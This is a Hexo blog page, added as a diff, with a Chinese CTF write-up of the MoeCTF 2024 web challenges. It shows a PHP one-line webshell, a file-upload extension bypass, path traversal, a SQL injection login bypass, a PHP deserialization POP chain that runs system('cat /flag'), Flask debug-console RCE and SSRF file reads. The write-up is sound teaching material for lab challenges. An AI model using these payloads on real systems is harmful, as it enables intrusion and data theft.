@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Moectf_2024web方向wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moectf_2024web">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/36666.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="Moectf_2024web方向wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd0887066befcec6e18c5f.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd093a066befcec6e18cf9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd0a90066befcec6e18f30.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd3f67066befcec6e1d68e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd3f95066befcec6e1d6c7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd4033066befcec6e1d7ce.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd41a7066befcec6e1da53.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd41e9066befcec6e1dae8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd42b4066befcec6e1dc73.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd431d066befcec6e1dd20.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd4d25066befcec6e1edd3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd48bc066befcec6e1e5ef.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cd4b0a066befcec6e1eab6.png">
+<meta property="article:published_time" content="2025-03-09T02:01:06.000Z">
+<meta property="article:modified_time" content="2025-03-09T15:30:54.530Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67cd0887066befcec6e18c5f.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/36666.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>moectf_2024web | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">63</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/36666.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          moectf_2024web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-09 10:01:06 / 修改时间：23:30:54" itemprop="dateCreated datePublished" datetime="2025-03-09T10:01:06+08:00">2025-03-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>Moectf_2024web方向wp</p>
+<span id="more"></span>
+
+<h1 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h1><p><img src="https://pic1.imgdb.cn/item/67cd0887066befcec6e18c5f.png"><br>这里可以执行任何指令 输入cat &#x2F;flag之后提示 你可以检查一下环境变量这个东西<br>输入env得到环境变量，看到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行结果：</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHP_EXTRA_CONFIGURE_ARGS</span>=--enable-fpm <span class="attribute">--with-fpm-user</span>=www-data <span class="attribute">--with-fpm-group</span>=www-data --disable-cgi <span class="attribute">KUBERNETES_SERVICE_PORT</span>=443 <span class="attribute">KUBERNETES_PORT</span>=tcp://10.43.0.1:443 <span class="attribute">USER</span>=www-data <span class="attribute">HOSTNAME</span>=ret2shell-106-7154-1741490286 <span class="attribute">PHP_INI_DIR</span>=/usr/local/etc/php <span class="attribute">SHLVL</span>=2 <span class="attribute">HOME</span>=/home/www-data <span class="attribute">PHP_LDFLAGS</span>=-Wl,-O1 -Wl,<span class="attribute">--hash-style</span>=both -pie <span class="attribute">PHP_CFLAGS</span>=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE <span class="attribute">-D_FILE_OFFSET_BITS</span>=64 PHP_MD5= <span class="attribute">PHP_VERSION</span>=7.3.11 <span class="attribute">GPG_KEYS</span>=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D <span class="attribute">PHP_CPPFLAGS</span>=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE <span class="attribute">-D_FILE_OFFSET_BITS</span>=64 <span class="attribute">PHP_ASC_URL</span>=https://www.php.net/get/php-7.3.11.tar.xz.asc/from/this/mirror <span class="attribute">PHP_URL</span>=https://www.php.net/get/php-7.3.11.tar.xz/from/this/mirror <span class="attribute">KUBERNETES_PORT_443_TCP_ADDR</span>=10.43.0.1 <span class="attribute">PATH</span>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin <span class="attribute">KUBERNETES_PORT_443_TCP_PORT</span>=443 <span class="attribute">KUBERNETES_PORT_443_TCP_PROTO</span>=tcp <span class="attribute">KUBERNETES_SERVICE_PORT_HTTPS</span>=443 <span class="attribute">KUBERNETES_PORT_443_TCP</span>=tcp://10.43.0.1:443 <span class="attribute">PHPIZE_DEPS</span>=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c <span class="attribute">KUBERNETES_SERVICE_HOST</span>=10.43.0.1 <span class="attribute">PWD</span>=/var/www/html <span class="attribute">PHP_SHA256</span>=657cf6464bac28e9490c59c07a2cf7bb76c200f09cfadf6e44ea64e95fa01021 <span class="attribute">FLAG</span>=moectf&#123;WelcOme_to_MoEcTf_anD_r0aDI_STArTuP-6Y_SxRHhh166&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h1><p><img src="https://pic1.imgdb.cn/item/67cd093a066befcec6e18cf9.png"><br>一句话木马：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>文件直接就可以上传，打开蚁剑连接 找了一圈没有找到flag<br>在蚁剑的虚拟终端中用php -i查看php的信息，在环境中找到了flag<br><img src="https://pic1.imgdb.cn/item/67cd0a90066befcec6e18f30.png"></p>
+<h1 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h1><p>这题也是一个文件上传，但是对文件的类型做了限制，只能上传图片<br>把一句话木马的格式改成jpg上传，但是用bp修改后缀后上传<br><img src="https://pic1.imgdb.cn/item/67cd3f67066befcec6e1d68e.png"><br>蚁剑打开<br><img src="https://pic1.imgdb.cn/item/67cd3f95066befcec6e1d6c7.png"><br>和上题一样，也要在蚁剑的虚拟终端里面用env或者php -i 找到环境变量的flag</p>
+<h1 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h1><p>题目描述：<br>Sxrhhh 做了一个文件浏览器，塞了很多东西进去。不知道你能不能从这一堆乱七八糟的文件里面，翻出你想要的 flag 呢？</p>
+<p>注意：题目中有一些 readme 文件，我觉得你不应该错过。</p>
+<p>再注：本题与 jail-lv1 考点无关，只是致敬 （cue） 一下 flag 位置<br><img src="https://pic1.imgdb.cn/item/67cd4033066befcec6e1d7ce.png"><br>先是根据题目的提示看了两个readme.md文件，但是没有发现什么隐藏的内容<br><img src="https://pic1.imgdb.cn/item/67cd41a7066befcec6e1da53.png"><br>但是发现这里访问文件的方式是get的参数，所以猜测可以目录穿越<br><img src="https://pic1.imgdb.cn/item/67cd41e9066befcec6e1dae8.png"><br>发现是可以的 到根目录下面，排除bin dev etc这些系统文件的目录之后一个个找  最后找到在&#x2F;tmp&#x2F;flag</p>
+<h1 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h1><p>题目描述<br>这是一个登陆页面。听说管理员叫 admin123 ，而且只要登陆成功，就会显示 flag 。可是，听管理员自己说，它自己的密码在密码强度检查器网站上，需要上百年才能被破译。那么，我们应该怎么登陆进去呢？</p>
+<p><img src="https://pic1.imgdb.cn/item/67cd42b4066befcec6e1dc73.png"><br>只有一个登录界面，根据题目的描述，知道了管理员账号，但是密码无法爆破出来<br>原来我是想试试sql注入有没有报错的回显的，没想到直接就出来flag了  这里的逻辑应该就是一个简单的拼接，把后面注释掉就满足条件了<br><img src="https://pic1.imgdb.cn/item/67cd431d066befcec6e1dd20.png"></p>
+<h1 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h1><p>一道反序列化的题</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
+<p>当<strong>试图把一个对象当作函数调用</strong>时，就会自动触发 <code>__invoke()</code> 方法。<br>随意要触发这个方法就要用到A类中的<code>$s($this-&gt;evil);</code>这里让<code>$s</code>是B类就可以触发invoke方法。<br>但是对于私有属性来说，不能直接赋值成一个对象。也不能在外部赋值，需要用到__construct函数<br>这题的pop链就是让evil是我们要执行的命令<code>&quot;cat /flag&quot;</code> 用<code>$s</code>中的a触发B类，B类中的<code>$b</code>是我们想要执行的函数<code>system</code><br><code>$evil</code>作为参数<code>$c</code>传入invoke<br>payload:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注意 private 属性的序列化哦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如何赋值呢</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>第一次没有用urlencode会报错 </p>
+<h1 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="headerlink" title="垫刀之路07: 泄漏的密码"></a>垫刀之路07: 泄漏的密码</h1><p>题目描述<br>Sxrhhh 正在使用 Flask 编写网站服务器，不慎泄漏了 PIN 码, 是时候给他一个乱用调试模式的教训了。<br>这是一个关于 Flask Debug Mode PIN 码泄露 的安全问题，通常意味着目标服务器运行在 Flask Debug 模式下，如果你能访问 Flask 的 Werkzeug Debugger，就可以执行任意 Python 代码（RCE）。<br>找到Flask Debugger 页面 &#x2F;console 或 &#x2F;_debugger 使用pin码解锁<br><img src="https://pic1.imgdb.cn/item/67cd4d25066befcec6e1edd3.png"><br>但是这里直接用os.system执行命令只会输出0 因为这是在console中<br>这里要用os.popen().read()函数，这个函数会执行shell命令并获取返回的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import <span class="built_in">os</span>;<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">&quot;cat flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;moectf&#123;Dont_UsinG-flasK-By_DebUG-MOD-AND_lE4K-y0UR-pIn19&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h1><p>题目描述<br>听闻在遥远的弗拉格之地，有着七颗龙珠。<br>只要集齐这七颗龙珠，就可以召唤出每一位 ctf 选手都想要的 flag<br>但是这个弗拉格之地与世隔绝，几乎没人能找到入口<br>不过，有一种生物，名为爬虫，它能带领各位找到那里</p>
+<p>提示是爬虫，所以就去robots.txt中看，这个文件是每个网站的允许爬虫和禁止爬虫的目录列表<br><img src="https://pic1.imgdb.cn/item/67cd48bc066befcec6e1e5ef.png"><br>访问这里出现的php文件之后拿到flag</p>
+<h1 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h1><p>题目描述<br>url后面怎么有个?url&#x3D;, 啧啧啧，这貌似是一个很经典的漏洞, flag在&#x2F;etc&#x2F;passwd里，嗯？这是一个什么文件 声明：题目环境出不了网，无法访问http资源，但这并不影响做题，您可以拿着源码本地测试</p>
+<p>把题目的源码拿过来看一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = <span class="title function_ invoke__">getimagesizefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>所以这题就是一个ssrf漏洞，这里的url没有做限制，根据题目的描述，flag就在&#x2F;etc&#x2F;passwd里  所以用flag协议读一下文件就出来了<br><img src="https://pic1.imgdb.cn/item/67cd4b0a066befcec6e1eab6.png"><br>关于ssrf我也出过一个bp实验室的这个专题的blog <a href="/posts/37808.html" title="SSRF漏洞学习笔记">SSRF漏洞学习笔记}&lt;&#x2F;p&gt; &lt;h1 id&#x3D;ProveYourLove&gt;&lt;a href&#x3D;#ProveYourLove class&#x3D;headerlink title&#x3D;ProveYourLove&gt;&lt;&#x2F;a&gt;ProveYourLove&lt;&#x2F;h1&gt;&lt;p&gt;题目描述&lt;br&gt;都七夕了，怎么还是单身狗丫？快拿起勇气向你 crush 表白叭，300份才能证明你的爱！&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd505a066befcec6e1f2c1.png&gt;&lt;&#x2F;p&gt; &lt;p&gt;这里就是要表白的表单提交300次才能得到flag&lt;br&gt;这里我就用bp中的爆破模块，随便选了一个字典爆破&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd5274066befcec6e1f54f.png&gt;&lt;&#x2F;p&gt; &lt;h1 id&#x3D;ez-http&gt;&lt;a href&#x3D;#ez-http class&#x3D;headerlink title&#x3D;ez_http&gt;&lt;&#x2F;a&gt;ez_http&lt;&#x2F;h1&gt;&lt;p&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd52b1066befcec6e1f5fa.png&gt;&lt;br&gt;根据提示用post请求发包&lt;br&gt;后面跟着提示，修改请求头，这题是包含常见的http基础的内容了&lt;br&gt;&lt;img src&#x3D;https:&#x2F;&#x2F;pic1.imgdb.cn&#x2F;item&#x2F;67cd53f0066befcec6e1f930.png&gt;&lt;&#x2F;p&gt; &lt;h1 id&#x3D;弗拉格之地的挑战-bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0&gt;&lt;a href&#x3D;#弗拉格之地的挑战-bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0 class&#x3D;headerlink title&#x3D;弗拉格之地的挑战   bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0&#x3D;&gt;&lt;&#x2F;a&gt;弗拉格之地的挑战 bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0&#x3D;&lt;&#x2F;h1&gt;&lt;p&gt;题目描述&lt;br&gt;web 七龙珠&lt;br&gt;欢迎来到弗拉格之地进行 web 七龙珠试炼&lt;br&gt;在这里，你将根据引导，完成数个任务，从而获得名为 flag 的东西&lt;br&gt;本次我们采用一个叫做分段 flag 的东西，将 flag 分为七颗龙珠，集齐七颗龙珠就可以获得最终的 flag&lt;br&gt;在这次挑战中，请随时准备好你的记事本哦&lt;br&gt;现在我们开始，提示在下面 